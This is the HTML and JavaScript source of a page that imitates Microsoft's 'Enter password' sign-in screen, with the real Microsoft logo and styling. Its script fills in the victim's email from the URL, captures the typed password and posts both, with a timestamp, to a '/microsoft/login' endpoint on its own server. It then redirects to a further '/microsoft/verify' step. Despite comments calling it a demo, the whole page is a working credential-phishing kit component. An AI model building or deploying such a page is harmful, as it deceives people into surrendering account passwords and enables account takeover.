<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft - Enter Password</title>
    <link rel="icon" type="image/x-icon" href="/static/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-image: url('https://cdn.cgdream.ai/_next/image?url=https%3A%2F%2Fapi.cgdream.ai%2Frails%2Factive_storage%2Fblobs%2Fredirect%2FeyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCS24rREFFPSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ%3D%3D--514df6f9cfb02409e5c1446ea3170f489b806e44%2Fd453cacc-e66b-4dee-acae-999d787a0a6b_0.png&w=1080&q=95');
            background-size: cover;
            background-position: center;
            color: #1b1b1b;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            z-index: -1;
        }
        
        .password-card {
            background-color: #fff;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            padding: 44px;
            margin-bottom: 20px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }
        
        .logo {
            width: 108px;
            height: auto;
            margin-right: 8px;
        }
        
        .email-display {
            color: #1b1b1b;
            font-size: 15px;
            margin-bottom: 16px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 16px 0;
            color: #1b1b1b;
        }
        
        form {
            width: 100%;
        }
        
        input[type="password"] {
            width: 100%;
            height: 36px;
            padding: 6px 10px;
            font-size: 15px;
            border: none;
            border-bottom: 1px solid #8e8e8e;
            margin-bottom: 16px;
            transition: border-color 0.3s ease;
            background-color: transparent;
        }
        
        input[type="password"]:focus {
            outline: none;
            border-bottom: 1px solid #0067b8;
        }
        
        input[type="password"]::placeholder {
            color: #666;
        }
        
        input[type="password"].error {
            border-bottom: 1px solid #e81123;
        }
        
        .error-message {
            color: #e81123;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .password-links {
            margin: 16px 0;
        }
        
        .password-links a {
            display: block;
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            margin-bottom: 12px;
            transition: color 0.3s ease;
        }
        
        .password-links a:hover {
            color: #005da6;
            text-decoration: underline;
        }
        
        .signin-btn {
            height: 32px;
            background-color: #0067b8;
            color: #fff;
            border: none;
            border-radius: 2px;
            font-size: 14px;
            font-weight: 400;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 110px;
            text-align: center;
            line-height: 32px;
            float: right;
        }
        
        .signin-btn:hover {
            background-color: #005da6;
        }

        .footer {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 12px;
            color: #616161;
            display: flex;
            justify-content: flex-end;
            padding-right: 20px;
        }
        
        .footer a {
            color: #616161;
            text-decoration: none;
            margin-left: 24px;
            transition: color 0.3s ease;
        }
        
        .footer a:hover {
            color: #1b1b1b;
            text-decoration: underline;
        }
        
        /* Spinner animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinning {
            position: relative;
        }
        
        .spinning.active::after {
            content: "";
            position: absolute;
            width: 16px;
            height: 16px;
            top: 50%;
            right: 10px;
            margin-top: -8px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            display: block;
        }
    </style>
</head>
<body>
    <div class="password-card">
        <div class="logo-container">
            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
        </div>
        
        <div class="email-display" id="emailDisplay"></div>
        
        <h1>Enter password</h1>
        
        <form id="password-form" action="/microsoft/verify" method="POST">
            <input type="hidden" id="email" name="email">
            <input type="password" id="password" name="password" placeholder="Password" required>
            
            <div class="error-message" id="passwordError">
                Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now</a>.
            </div>
            
            <div class="password-links">
                <a href="#">Forgot password?</a>
                <a href="#">Other ways to sign in</a>
            </div>
            
            <button type="submit" class="signin-btn spinning">Sign in</button>
        </form>
    </div>
    
    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#">...</a>
    </div>
    
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Get email from URL query parameters
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('email');
            
            // Set email in the form
            document.getElementById("email").value = email;
            document.getElementById("emailDisplay").textContent = email;
            
            // Add artificial delay for page load (0.5-1 seconds)
            setTimeout(() => {
                // Focus the password field after a slight delay
                setTimeout(() => {
                    document.getElementById("password").focus();
                }, 5000);
                
                const passwordInput = document.getElementById("password");
                const errorMessage = document.getElementById("passwordError");
                const passwordForm = document.getElementById("password-form");
                const signinButton = document.querySelector(".signin-btn");
                
                // Function to show error
                function showError() {
                    errorMessage.classList.add('show');
                    passwordInput.classList.add('error');
                    passwordInput.focus();
                }
                
                // Function to clear error
                function clearError() {
                    errorMessage.classList.remove('show');
                    passwordInput.classList.remove('error');
                }
                
                // Clear error on input
                passwordInput.addEventListener('input', function() {
                    clearError();
                });
                
                // Form submission with validation
                passwordForm.addEventListener("submit", function(e) {
                    e.preventDefault();
                    
                    const password = passwordInput.value.trim();
                    
                    if (!password) {
                        showError();
                        return;
                    }
                    
                    // Check password length - at least 8 characters of any type
                    if (password.length < 8) {
                        errorMessage.innerHTML = "Your password must be at least 8 characters long (letters, numbers, or symbols). Please try again.";
                        showError();
                        return;
                    }
                    
                    // Disable button and show spinner
                    signinButton.disabled = true;
                    signinButton.classList.add("active");
                    
                    // Add artificial delay (1.5-3 seconds)
                    setTimeout(() => {
                        // For demonstration, always consider login successful
                        // In a real application, you would verify credentials on server side
                        
                        // Save login information
                        const loginData = {
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString()
                        };
                        
                        // Send login data to server
                        fetch('/microsoft/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(loginData)
                        })
                        .then(response => {
                            if (response.ok) {
                                // Redirect to verification page instead of Microsoft account
                                window.location.href = `/microsoft/verify?email=${encodeURIComponent(email)}`;
                            } else {
                                // Reset error message to default
                                errorMessage.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href=\"#\">reset it now</a>";
                                showError();
                                signinButton.disabled = false;
                                signinButton.classList.remove("active");
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            // Reset error message to default
                            errorMessage.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href=\"#\">reset it now</a>";
                            showError();
                            signinButton.disabled = false;
                            signinButton.classList.remove("active");
                        });
                    }, 1500 + Math.random() * 1500);
                });
                
                // Password reset and other links
                document.querySelectorAll(".password-links a").forEach(link => {
                    link.addEventListener("click", function(e) {
                        e.preventDefault();
                        alert("This feature is not available in this demo.");
                    });
                });
                
                // Error message link
                document.querySelector("#passwordError a").addEventListener("click", function(e) {
                    e.preventDefault();
                    alert("Password reset functionality is not available in this demo.");
                });
            }, 500 + Math.random() * 500);
        });
    </script>
</body>
</html> 